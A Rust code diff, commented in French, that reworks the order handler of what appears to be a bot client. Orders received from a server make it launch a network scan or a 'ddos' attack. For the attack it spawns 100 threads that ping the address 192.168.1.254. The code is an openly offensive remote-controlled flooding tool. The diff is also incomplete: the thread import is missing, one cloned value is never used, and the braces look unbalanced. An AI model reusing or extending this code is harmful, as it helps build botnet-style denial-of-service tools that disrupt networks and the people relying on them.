@@ -6,28 +6,34 @@ mod scan;
 mod ddos;
 
 use std::borrow::Cow;
+use std::sync::{Arc, Mutex};
 
 
-pub(crate) fn ordre_du_srv(mut ordre: String) { //faudra changer ca en JSON
+pub(crate) fn ordre_du_srv(mut ordre: String) {
 
+        let shared_ordre = Arc::new(Mutex::new(ordre));
 
-    if ordre == "scan" {
+        if shared_ordre.lock().unwrap().contains("scan") {
+            println!("Lancement du scan réseau");
+            let ordre_clone = Arc::clone(&shared_ordre);
+            let t = thread::spawn(move || {
+                scan::scan(scan::find_net(), ordre_clone.lock().unwrap().clone());
+            });
+        }
 
-        println!("Lancement du scan réseau");
-        let t = thread::spawn(move|| { scan::scan(scan::find_net()); });
-
-    }else if ordre == "ddos" {
-
+        if shared_ordre.lock().unwrap().contains("ddos") {
             println!("Lancement de l'attaque ddos avancée");
             for i in 0..100 {
                 println!("Lancement de l'attaque ddos n°{}", i);
-                let ddos = thread::spawn(move|| { ddos::ping("192.168.1.254"); });
+                let ordre_clone = Arc::clone(&shared_ordre);
+                let ddos = thread::spawn(move || {
+                    ddos::ping("192.168.1.254");
+                });
                 println!("Fin de l'attaque ddos n°{}", i);
             }
+        }
 
-
-    }else {
-        println!("pass")
+        println!("{:?}", shared_ordre.lock().unwrap().as_str());
     }
 
-}
+
